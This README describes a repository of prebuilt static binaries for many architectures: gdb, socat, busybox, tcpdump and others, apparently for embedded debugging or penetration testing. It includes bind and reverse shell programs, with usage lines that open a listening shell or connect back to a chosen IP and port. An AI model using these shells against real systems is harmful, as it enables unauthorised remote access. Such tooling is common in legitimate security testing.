# prebuilt-multiarch-bin

prebuilt binaries for multiple architeture (arm, armeb, aarch64, aarch64_be, mips, mips1, mipsel, mipsel1, mips64, mips64el, powerpc, powerpc64, powerpc64le, riscv64, i586, x86_64)

all binaries are statically linked and stripped
## Buildroot

* MIPS-I and MIPSEL-I are using `buildroot 2014.11` because they remove the support after that version
* others are using `buildroot 2019.11.1`
* compiled toolchain can be found at action's artifacts page (mips1/mipsel1 are file package from `output/host`, others are from `make sdk`)

## Items

- gdb (mips1/mipsel1 are using `gdb 7.12.1`, others are `8.3.1`)
- socat
- busybox
- bind/reverse shell
- tcpdump
- strace
- dropbear(some arch)
- lsof

## Bind/Reverse Shell binary

* run the bind shell without arguments like `./bind_shell` will listening on the port 3343 and `./bind_shell 6666` will listen on 6666.
* run the reverse shell binary without arguments will connect to 127.0.0.1:3343 , one could use a hex editor the change cstring cotains the ip/port. or `./reverse_shell 1.1.1.1 12345` will connect to 1.1.1.1:12345; `./reverse_shell 1.1.1.1` will connect to 1.1.1.1:3343

## gdb (*Important*)

- gdbserver is compiled without libthread_db
- gdb need libthread_db.so.1 to support multithread debug, if you run into SIGSEGV when `r` the program, run `set libthread-db-search-path 0` in gdb first, then there will be warning about libthread_db.so.1, just ignore it.

## Github Actions

the config file for buildroot and github actions' workflow file are in the `src` branch
